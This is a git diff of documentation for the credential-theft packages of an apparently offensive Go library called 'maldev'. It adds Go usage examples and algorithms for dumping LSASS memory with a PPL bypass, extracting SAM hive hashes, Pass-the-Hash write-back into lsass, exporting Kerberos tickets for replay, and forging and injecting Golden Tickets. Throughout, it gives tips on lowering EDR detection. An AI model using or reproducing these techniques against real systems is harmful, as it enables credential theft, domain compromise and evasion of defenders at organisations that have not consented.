@@ -1,13 +1,15 @@
 [← Back to README](../README.md)
 
-# Credentials — LSASS dump + parse
+# Credentials — LSASS dump, SAM dump, PTH, kirbi, Golden Ticket
 
-The `credentials/` tree is split into a **producer** + **consumer** pair:
+The `credentials/` tree groups four packages by acquisition target:
 
 | Package | Role | Platform | Touches |
 |---|---|---|---|
-| `credentials/lsassdump` | **Producer** — captures lsass.exe memory into a MINIDUMP blob | Windows | `NtOpenProcess` + `NtReadVirtualMemory` against lsass; optionally a `kernel/driver.ReadWriter` for PPL bypass |
-| `credentials/sekurlsa` | **Consumer** — parses a MINIDUMP, decrypts the MSV1_0 logon-session list, surfaces NTLM hashes | cross-platform (pure Go) | nothing — no Win32 calls; an analyst Linux box can parse a Windows dump |
+| `credentials/lsassdump` | **Producer** — captures lsass.exe memory into a MINIDUMP blob (T1003.001) | Windows | `NtOpenProcess` + `NtReadVirtualMemory` against lsass; optionally a `kernel/driver.ReadWriter` for PPL bypass |
+| `credentials/sekurlsa` | **Consumer** — parses a MINIDUMP, decrypts every walker (MSV1_0 / Wdigest / Kerberos / DPAPI / TSPkg / CloudAP / LiveSSP / CredMan), exposes Pass-the-Hash write-back (T1550.002) and Kerberos kirbi export (T1550.003) | cross-platform (pure Go) | nothing for parse; PTH writes back into live lsass via `NtWriteVirtualMemory` |
+| `credentials/samdump` | **Offline SAM/SYSTEM hive parser** — extracts NT/LM hashes from registry hive files (T1003.002) | cross-platform (pure Go) | live mode (`LiveDump`) shells `reg save`; offline mode is bytes-in / Account-out |
+| `credentials/goldenticket` | **Golden Ticket** — pure-Go PAC marshaling + KRB5 `Forge` + LSA `Submit` via `Secur32!LsaCallAuthenticationPackage(KerbSubmitTicketMessage)` (T1558.001 / T1550.003) | Windows for `Submit`, cross-platform for `Forge` | LSA RPC for ticket injection |
 
 Pair them in-process for "dump → extract → wipe" with no on-disk
 persistence:
@@ -396,15 +398,172 @@ optional driver-assisted PPL bypass.
 
 ### Limitations
 
-- v0.25.x ships MSV1_0 + Wdigest + DPAPI. Kerberos tickets and
-  LiveSSP / TSPkg / CloudAP secrets are each separate ~300-500 LOC
-  follow-ups on top of the v0.23.x crypto layer.
-- Wdigest and DPAPI defaults are not yet inlined — operators
-  register per-build offsets manually. Default-template auto-enable
-  is expected in subsequent point releases once each provider's
-  signatures are verified against a real binary.
+- v0.32.x ships every walker (MSV1_0 / Wdigest / DPAPI / TSPkg /
+  Kerberos / CloudAP / LiveSSP / CredMan) with built-in templates
+  for Win 7 SP1 → Win 11 25H2.
 - x64 only. The `Architecture` enum reserves `ArchX86` for a future
   WoW64 variant.
 - Credential Guard / LSAISO trustlet sessions surface as warnings —
   the dump contains the wrappers but the secrets are kernel-isolated
   ciphertext we can't decrypt without a separate primitive.
+
+---
+
+## `credentials/sekurlsa` — Pass-the-Hash (`Pass` / `PassImpersonate`)
+
+`Pass` and `PassImpersonate` write the operator's NTLM (and
+optionally AES128/AES256) credentials back into a freshly-spawned
+process's lsass session. The spawned process then outbound-
+authenticates as the impersonated principal on every subsequent
+network auth (SMB, RDP, NTLM challenge-response, and — when AES
+keys are supplied — Kerberos AS-REQ pre-auth).
+
+```go
+import "github.com/oioio-space/maldev/credentials/sekurlsa"
+
+ntlm, _ := hex.DecodeString("31d6cfe0d16ae931b73c59d7e0c089c0") // empty-string NT
+res, err := sekurlsa.Pass(sekurlsa.PTHParams{
+    Decoy: `C:\Windows\System32\cmd.exe`,
+    DecoyArgs: `/c "ping -t 127.0.0.1 -n 99999 >nul"`, // long-running stub
+    Target: sekurlsa.PTHTarget{
+        Domain: "CORP", Username: "alice",
+        NTLM: ntlm, // 16 bytes
+    },
+})
+if err != nil { /* errors.Is(err, sekurlsa.ErrPTHNoMatchingLUID) → spawn lost the LUID */ }
+fmt.Printf("PID=%d MSV=%v Kerb=%v\n", res.PID, res.MSVOverwritten, res.KerberosOverwritten)
+// res.PID is the spawned process — operator's "handle" to the impersonated session.
+```
+
+`PassImpersonate` adds a final `SetThreadToken` step so the calling
+thread *also* outbound-authenticates as the target until
+`windows.RevertToSelf()`. MITRE: T1550.002.
+
+Detection level: **HIGH** for both — `PROCESS_VM_WRITE` on lsass is
+one of the loudest events any EDR watches. Route the
+`NtWriteVirtualMemory` calls through a `*wsyscall.Caller` (passed in
+`PTHParams.Caller`) to reduce the user-mode hook surface.
+
+---
+
+## `credentials/sekurlsa` — Kerberos kirbi export (`KerberosTicket.ToKirbi`)
+
+Every `KerberosTicket` returned by `sekurlsa.Parse` carries the
+ASN.1-encoded ticket bytes plus, on builds with a registered
+`KerberosLayout.TicketSessionKey*Offset`, the decrypted per-ticket
+session key. `ToKirbi` wraps these into the mimikatz-format KRB-CRED
+file ready for Rubeus / impacket / pypykatz consumption (T1550.003).
+
+```go
+for _, s := range result.Sessions {
+    for _, c := range s.Credentials {
+        if k, ok := c.(*sekurlsa.KerberosCredential); ok {
+            for _, t := range k.Tickets {
+                path, err := t.ToKirbiFile("./tickets/")
+                if err != nil { continue }
+                fmt.Printf("exported %s\n", path)
+            }
+        }
+    }
+}
+```
+
+The exported `.kirbi` is a valid APPLICATION 22 KRB-CRED with an
+unencrypted EncKrbCredPart (etype=0 convention) — Rubeus describe,
+impacket ticketConverter, and gettgtpkinit all parse it directly.
+Replay (`Pass-the-Ticket`) needs the session key, which the walker
+extracts from `KIWI_KERBEROS_INTERNAL_TICKET` on Win 10 1607+ /
+Win 11 21H2+ builds.
+
+---
+
+## `credentials/samdump`
+
+Pure-Go offline dump of the Windows SAM hive. Pair with a
+pre-staged SYSTEM hive (the boot key lives there) to recover every
+local account's NT/LM hash without touching lsass. MITRE: T1003.002.
+
+| Mode | Surface | Detection |
+|---|---|---|
+| Offline | `Dump(systemReader, systemSize, samReader, samSize) (Result, error)` | none on parse — pure-Go REGF + crypto math |
+| Live (Windows) | `LiveDump(dir string) (Result, sysPath, samPath string, error)` | HIGH — `reg save HKLM\SAM` is a Defender behavioral signal |
+
+```go
+import "github.com/oioio-space/maldev/credentials/samdump"
+
+// Offline — operator already exfilled the hives.
+sysF, _ := os.Open("system.hive")
+defer sysF.Close()
+sysSt, _ := sysF.Stat()
+samF, _ := os.Open("sam.hive")
+defer samF.Close()
+samSt, _ := samF.Stat()
+
+res, err := samdump.Dump(sysF, sysSt.Size(), samF, samSt.Size())
+if err != nil { /* errors.Is(err, samdump.ErrBootKey) → SYSTEM hive incomplete */ }
+
+fmt.Print(res.Pwdump())
+// alice:1001:00000000000000000000000000000000:0cb6948805f797bf2a82807973b89537:::
+// bob:1002:00000000000000000000000000000000:c35565c5879bc7a79c506a39d054a03f:::
+```
+
+Algorithm:
+
+1. SYSTEM hive → walk `ControlSet001\Control\Lsa\{JD,Skew1,GBG,Data}`
+   → 16 raw bytes scattered across class-name strings →
+   permute through Microsoft's stable 16-position table → boot key.
+2. SAM hive → `Domains\Account\F` → SAM_KEY_DATA_AES envelope (or
+   legacy SAM_KEY) → AES-128-CBC(bootkey, IV=Salt).decrypt → first
+   16 bytes are the per-domain hashed bootkey.
+3. SAM hive → `Domains\Account\Users\<RID-hex>\V` → 0xCC-byte offset
+   table → username + per-user NT/LM SAM_HASH wrapper.
+4. Per user: SAM_HASH revision dispatch (legacy MD5+RC4 vs AES
+   envelope) → 16-byte intermediate → split RID into two DES keys
+   via `transformKey56to64` → DES-ECB decrypt the two halves → final
+   NT/LM hash.
+
+Validated on Win 10 1809 + Win 11 24H2 — both round-trip the
+canonical empty-string hashes for built-in Administrator + Guest
+(no warnings) and recover 16-byte NT hashes for password-set
+accounts. Cross-build determinism verified (same `test` user
+produces identical hash on both VMs).
+
+Limitations:
+
+- `LiveDump` shells `reg save`; `NtSaveKey` direct-syscall path is
+  queued.
+- VSS shadow-copy acquisition (for files reg-save can't reach —
+  `NTDS.dit`, `lsass.exe`) lives under `recon/shadowcopy` — separate
+  effort.
+- AD `NTDS.dit` parsing (T1003.003) is a separate package; the SAM
+  algorithm only covers local-machine hives.
+
+---
+
+## `credentials/goldenticket`
+
+`Forge` builds a Golden Ticket (encrypted TGT) from operator-
+supplied krbtgt key + domain SID + user RID; `Submit` injects a
+serialized ticket into the calling user's LSA cache via
+`Secur32!LsaCallAuthenticationPackage(KerbSubmitTicketMessage)`.
+
+```go
+import "github.com/oioio-space/maldev/credentials/goldenticket"
+
+ticket, err := goldenticket.Forge(goldenticket.ForgeParams{
+    User: "Administrator", Domain: "CORP.LOCAL",
+    DomainSID: "S-1-5-21-3623811015-3361044348-30300820",
+    UserRID: 500,
+    KrbtgtKey: krbtgtAES256, // from DCSync or NTDS dump
+    KrbtgtKeyType: 18,        // AES256_CTS_HMAC_SHA1_96
+})
+if err != nil { panic(err) }
+if err := goldenticket.Submit(ticket); err != nil { panic(err) }
+// Operator's process now uses the forged TGT for every Kerberos
+// outbound until windows.RevertToSelf() or thread exit.
+```
+
+MITRE: T1558.001 (Forge) + T1550.003 (Submit). Detection level:
+**MEDIUM-HIGH** — domain controllers can flag forged TGTs by
+mismatched signature checksums (PAC validation), unusual ticket
+lifetimes, or replay against the same krbtgt KVNO.
